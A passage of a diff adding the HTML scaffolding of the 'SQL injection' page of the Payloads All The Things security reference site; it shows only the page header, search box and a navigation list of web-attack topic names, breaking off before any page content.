@@ -1,0 +1,4616 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      <link rel="icon" href="../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.3.1, mkdocs-material-8.4.3">
+    
+    
+      
+        <title>SQL injection - Payloads All The Things</title>
+      
+    
+    
+      <link rel="stylesheet" href="../assets/stylesheets/main.6b80c2a2.min.css">
+      
+        
+        <link rel="stylesheet" href="../assets/stylesheets/palette.cbb835fc.min.css">
+        
+      
+      
+    
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="" data-md-color-accent="">
+  
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&"object"==typeof palette.color)for(var key of Object.keys(palette.color))document.body.setAttribute("data-md-color-"+key,palette.color[key])</script>
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#sql-injection" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href=".." title="Payloads All The Things" class="md-header__button md-logo" aria-label="Payloads All The Things" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Payloads All The Things
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              SQL injection
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      <form class="md-header__option" data-md-component="palette">
+        
+          
+          
+          <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="" data-md-color-accent=""  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
+          
+            <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_2" hidden>
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69Z"/></svg>
+            </label>
+          
+        
+          
+          
+          <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="" data-md-color-accent=""  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_2">
+          
+            <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12c0-2.42-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69Z"/></svg>
+            </label>
+          
+        
+      </form>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" aria-label="Clear" tabindex="-1">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href=".." title="Payloads All The Things" class="md-nav__button md-logo" aria-label="Payloads All The Things" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    Payloads All The Things
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href=".." class="md-nav__link">
+        Payloads All The Things [![Tweet](https://img.shields.io/twitter/url/http/shields.io.svg?style=social)](https://twitter.com/intent/tweet?text=Payloads%20All%20The%20Things,%20a%20list%20of%20useful%20payloads%20and%20bypasses%20for%20Web%20Application%20Security%20-%20by%20@pentest_swissky&url=https://github.com/swisskyrepo/PayloadsAllTheThings/)
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../BOOKS/" class="md-nav__link">
+        Books
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CONTRIBUTING/" class="md-nav__link">
+        CONTRIBUTING
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../TWITTER/" class="md-nav__link">
+        Twitter
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../YOUTUBE/" class="md-nav__link">
+        Youtube
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_6" type="checkbox" id="__nav_6" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_6">
+          API Key Leaks
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="API Key Leaks" data-md-level="1">
+        <label class="md-nav__title" for="__nav_6">
+          <span class="md-nav__icon md-icon"></span>
+          API Key Leaks
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../API%20Key%20Leaks/" class="md-nav__link">
+        API Key Leaks
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_7" type="checkbox" id="__nav_7" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_7">
+          AWS Amazon Bucket S3
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="AWS Amazon Bucket S3" data-md-level="1">
+        <label class="md-nav__title" for="__nav_7">
+          <span class="md-nav__icon md-icon"></span>
+          AWS Amazon Bucket S3
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../AWS%20Amazon%20Bucket%20S3/" class="md-nav__link">
+        Amazon Bucket S3 AWS
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_8" type="checkbox" id="__nav_8" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_8">
+          Account Takeover
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Account Takeover" data-md-level="1">
+        <label class="md-nav__title" for="__nav_8">
+          <span class="md-nav__icon md-icon"></span>
+          Account Takeover
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Account%20Takeover/" class="md-nav__link">
+        Account Takeover
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_9" type="checkbox" id="__nav_9" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_9">
+          CORS Misconfiguration
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="CORS Misconfiguration" data-md-level="1">
+        <label class="md-nav__title" for="__nav_9">
+          <span class="md-nav__icon md-icon"></span>
+          CORS Misconfiguration
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CORS%20Misconfiguration/" class="md-nav__link">
+        CORS Misconfiguration
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_10" type="checkbox" id="__nav_10" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_10">
+          CRLF Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="CRLF Injection" data-md-level="1">
+        <label class="md-nav__title" for="__nav_10">
+          <span class="md-nav__icon md-icon"></span>
+          CRLF Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CRLF%20Injection/" class="md-nav__link">
+        CRLF
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_11" type="checkbox" id="__nav_11" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_11">
+          CSRF Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="CSRF Injection" data-md-level="1">
+        <label class="md-nav__title" for="__nav_11">
+          <span class="md-nav__icon md-icon"></span>
+          CSRF Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CSRF%20Injection/" class="md-nav__link">
+        Cross-Site Request Forgery
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_12" type="checkbox" id="__nav_12" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_12">
+          CSV Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="CSV Injection" data-md-level="1">
+        <label class="md-nav__title" for="__nav_12">
+          <span class="md-nav__icon md-icon"></span>
+          CSV Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CSV%20Injection/" class="md-nav__link">
+        CSV Injection (Formula Injection)
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_13" type="checkbox" id="__nav_13" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_13">
+          CVE Exploits
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="CVE Exploits" data-md-level="1">
+        <label class="md-nav__title" for="__nav_13">
+          <span class="md-nav__icon md-icon"></span>
+          CVE Exploits
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CVE%20Exploits/" class="md-nav__link">
+        Common Vulnerabilities and Exposures
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CVE%20Exploits/Log4Shell/" class="md-nav__link">
+        CVE-2021-44228 Log4Shell
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_14" type="checkbox" id="__nav_14" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_14">
+          Command Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Command Injection" data-md-level="1">
+        <label class="md-nav__title" for="__nav_14">
+          <span class="md-nav__icon md-icon"></span>
+          Command Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Command%20Injection/" class="md-nav__link">
+        Command Injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_15" type="checkbox" id="__nav_15" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_15">
+          DNS Rebinding
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="DNS Rebinding" data-md-level="1">
+        <label class="md-nav__title" for="__nav_15">
+          <span class="md-nav__icon md-icon"></span>
+          DNS Rebinding
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../DNS%20Rebinding/" class="md-nav__link">
+        DNS Rebinding
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_16" type="checkbox" id="__nav_16" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_16">
+          Dependency Confusion
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Dependency Confusion" data-md-level="1">
+        <label class="md-nav__title" for="__nav_16">
+          <span class="md-nav__icon md-icon"></span>
+          Dependency Confusion
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Dependency%20Confusion/" class="md-nav__link">
+        Dependency Confusion
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_17" type="checkbox" id="__nav_17" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_17">
+          Directory Traversal
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Directory Traversal" data-md-level="1">
+        <label class="md-nav__title" for="__nav_17">
+          <span class="md-nav__icon md-icon"></span>
+          Directory Traversal
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Directory%20Traversal/" class="md-nav__link">
+        Directory traversal
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_18" type="checkbox" id="__nav_18" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_18">
+          File Inclusion
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="File Inclusion" data-md-level="1">
+        <label class="md-nav__title" for="__nav_18">
+          <span class="md-nav__icon md-icon"></span>
+          File Inclusion
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../File%20Inclusion/" class="md-nav__link">
+        File Inclusion
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_19" type="checkbox" id="__nav_19" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_19">
+          GraphQL Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="GraphQL Injection" data-md-level="1">
+        <label class="md-nav__title" for="__nav_19">
+          <span class="md-nav__icon md-icon"></span>
+          GraphQL Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../GraphQL%20Injection/" class="md-nav__link">
+        GraphQL injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_20" type="checkbox" id="__nav_20" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_20">
+          HTTP Parameter Pollution
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="HTTP Parameter Pollution" data-md-level="1">
+        <label class="md-nav__title" for="__nav_20">
+          <span class="md-nav__icon md-icon"></span>
+          HTTP Parameter Pollution
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../HTTP%20Parameter%20Pollution/" class="md-nav__link">
+        HTTP Parameter Pollution
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_21" type="checkbox" id="__nav_21" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_21">
+          Insecure Deserialization
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Insecure Deserialization" data-md-level="1">
+        <label class="md-nav__title" for="__nav_21">
+          <span class="md-nav__icon md-icon"></span>
+          Insecure Deserialization
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Insecure%20Deserialization/" class="md-nav__link">
+        Insecure Deserialization
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Insecure%20Deserialization/Java/" class="md-nav__link">
+        Java Deserialization
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Insecure%20Deserialization/PHP/" class="md-nav__link">
+        PHP Object injection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Insecure%20Deserialization/Python/" class="md-nav__link">
+        Python Deserialization
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Insecure%20Deserialization/Ruby/" class="md-nav__link">
